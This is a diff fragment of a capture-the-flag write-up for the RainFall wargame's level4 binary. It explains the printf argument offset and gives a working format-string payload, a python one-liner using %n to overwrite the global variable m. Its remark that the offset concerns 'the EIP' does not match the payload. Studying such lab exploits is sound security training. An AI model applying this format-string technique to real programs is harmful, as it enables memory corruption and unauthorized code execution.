@@ -39,8 +39,12 @@ level4:     file format elf32-i386
 08049810 g     O .bss	00000004              m
 080484a7 g     F .text	0000000d              main
 ```
+
 We have to input 16930116 bytes so it pass the if statement
 
+## Exploitation
+
+%12 is the offset of the printf arguments and the address of the EIP
 
 ```bash
 level4@RainFall:~$ python -c 'import struct; print struct.pack("I", 0x8049810)+"%16930112u"+"%12$n"' | ./level4
